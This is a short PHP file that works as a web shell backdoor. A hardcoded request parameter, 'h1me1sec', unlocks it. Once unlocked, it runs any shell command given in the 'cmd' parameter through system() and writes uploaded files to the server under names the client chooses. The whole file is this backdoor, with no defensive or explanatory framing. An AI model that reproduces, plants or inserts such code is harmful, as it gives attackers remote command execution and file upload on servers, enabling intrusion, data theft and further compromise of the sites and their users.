<?php
$pass = "h1me1sec";
if(isset($_REQUEST[$pass])) {
    echo "<pre>";
    if(isset($_REQUEST['cmd'])) {
        system($_REQUEST['cmd']);
    }
    if(isset($_FILES['up'])) {
        move_uploaded_file($_FILES['up']['tmp_name'], $_FILES['up']['name']);
    }
    echo "</pre>";
}
?>